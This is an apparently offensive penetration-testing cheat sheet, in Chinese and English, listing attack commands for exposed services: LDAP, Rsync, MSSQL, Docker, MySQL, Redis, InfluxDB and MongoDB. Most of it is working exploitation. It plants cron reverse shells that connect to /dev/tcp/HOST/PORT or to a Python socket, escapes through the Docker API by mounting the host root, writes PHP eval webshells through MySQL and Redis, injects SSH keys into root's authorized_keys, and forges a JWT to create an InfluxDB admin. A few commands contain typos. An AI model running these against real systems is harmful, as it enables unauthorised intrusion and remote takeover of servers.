# 端口测试

## 389 LDAP

```bash
# 优先使用工具, nuclei 的检测局限于开启了 HTTP 服务的 LDAP
# https://www.ldapsoft.com/download.html
# 配置服务主机的信息直接连接即可

# https://github.com/projectdiscovery/nuclei
# ... {{BaseURL}}/templates/config/profmanage.php
nuclei -t ~/nuclei-templates/http/misconfiguration/unauth-ldap-account-manager.yaml -l ip.txt
```

## 873 Rsync

```bash
HOST=;PORT=873;

# Judgement
rsync rsync://$HOST:$PORT/

# Download
rsync -av rsync://$HOST:$PORT/src/etc/passwd ./passwd.downloaded

# upload
rsync -av reverse_shell rsync://$HOST:$PORT/src/etc/cron.d/reverse_shell
```

## 1433 MSSQL

```bash
# 查看 xp_cmdshell 开启状状态 0 Closed / 1 Opened
EXEC sp_configure 'xp_cmdshell';
GO

# 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXEC sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO

# 使用 xp_cmdshell 执行 whoami 命令
EXEC xp_cmdshell 'whoami';
GO
EXEC dbName..xp_cmdshell 'whoami';
GO

# 禁用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
GO
RECONFIGURE;
GO

# 执行外部 Python 脚本
EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'
```

## 1883 MQTT

```bash
# https://github.com/thomasnordquist/MQTT-Explorer

# https://github.com/projectdiscovery/nuclei
# nuclei -t ~/nuclei-templates/http/misconfiguration/unauth-zwave-mqtt.yaml -target $HOST
# nuclei -t ~/nuclei-templates/http/misconfiguration/unauth-zwave-mqtt.yaml -l host.txt
# UNKNOWN ERROR
```

## 2375 Docker

```bash
HOST=;PORT=2375;

# Judgement
curl $HOST:$PORT/version
curl $HOST:$PORT/info
docker -H tcp://$HOST:$PORT images


# Exploit
docker -H tcp://$HOST:$PORT run -it -v /:/mnt nginx:latest --name nginx-test /bin/bash
HOST=;PORT=; # Configure VPS information
echo "* * * * * root export RHOST="HOST";export RPORT=6789;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'" > /mnt/etc/cron.d/reverse_shell_python
echo "* * * * * root /bin/bash -i >& /dev/tcp/HOST/PORT 0>&1 > /mnt/etc/cron.d/reverse_shell


# Batch testing
# FOFA: protocol=ldap
# https://github.com/projectdiscovery/nuclei
# ... http://{{Hostname}}/version
# ... http://{{Hostname}}/v1.24/version
nuclei -t ~/nuclei-templates/http/misconfiguration/exposed-docker-api.yaml -l host+port.txt
```

## 3306 MySQL

```bash
# Query the value of "secure_file_priv"
SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';

# Exploit - "into outfile" Write files.
select '<?php phpinfo(); ?>' into outfile '/var/ww/html/phpinfo.php';
sqlmap -u "URL" --file-write="/local/file" --file-dest="/remote/file"

# Exploit - sqlmap GetShell
sqlmap -u "URL" --ox-shell

# Exploit - "MySQL log" Write files.
SHOW VARIABLES LIKE '%general%';
SET GLOBAL general_log = "ON";
SET GLOBAL general_log_file="/var/www/html/shell.php";
SLECT '<?php phpinfo(); ?>';
```

## 6379 Redis

```bash
HOST=; PORT=6379;

# Judgement
1) telnet $HOST $PORT
2) info


# Exploit - Write files
# SAVE 执行时会将所有数据快照以 RDB 文件的形式保存到硬盘
redis-cli -h $HOST -p $PORT
CONFIG SET DIR /var/www/html
CONFIG SET DBFILENAME exec.php
SET crackit "\n\n\n\n<?php @eval($_REQUEST['exec']);?>\n\n\n\n"
SAVE


# Exploit - Reverse shells
# SAVE 执行时会将所有数据快照以 RDB 文件的形式保存到硬盘
redis-cli -h $HOST -p $PORT
CONFIG SET DIR /var/spool/cron
CONFIG SET DBFILENAME root
SET crackit "\n\n\n\n* * * * * bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
SAVE
# or
CONFIG SET DIR /etc/cron.d
CONFIG SET DBFILENAME reverse_shell
SET crackit "\n\n\n\n* * * * * root bash -i >& /dev/tcp/HOST/PORT 0>&1\n\n\n\n"
SAVE


# Exploit - Write the SSH public key
# ssh-keygen -t rsa
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/id_rsa.pub
cat /tmp/id_rsa.pub | redis-cli -h $HOST -p $PORT -x set crackit
rm /tmp/id_rsa.pub

redis-cli -h $HOST -p $PORT
CONFIG SET DIR /root/.ssh/
CONFIG SET DBFILENAME "authorized_keys"
SAVE

ssh -i ~/.ssh/id_rsa root@HOST
```

## 8086 InfluxDB

```bash
# Judgement
curl $URL/debug/vars

# CVE-2019-20933
# Get authorization
# https://jwt.io/
# Algorithm: HS256
{
  "username": "admin",
  "exp": 2986346267
}
# VERIFY SIGNATURE: null

HOST=VULNHOST; PORT=8086;
URL=http://$HOST:$PORT
AUTH="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s"
USNM=influx
PSWD=123456
BODY=q="CREATE USER \"$USNM\" with PASSWORD '$PSWD' WITH ALL PRIVILEGES;"

curl -X POST -H $AUTH -d $BODY $URL/query
  # {"results":[{"statement_id":0}]}
# https://github.com/influxdata/chronograf
chronograf --influxdb-url="$URL" --influxdb-username="$USNM" --influxdb-password="$PSWD"
```

## 27017 MongoDB

```bash
# https://github.com/projectdiscovery/nuclei
nuclei -t ~/nuclei-templates/network/misconfig/mongodb-unauth.yaml -target $IP
nuclei -t ~/nuclei-templates/network/misconfig/mongodb-unauth.yaml -l ip.txt
```
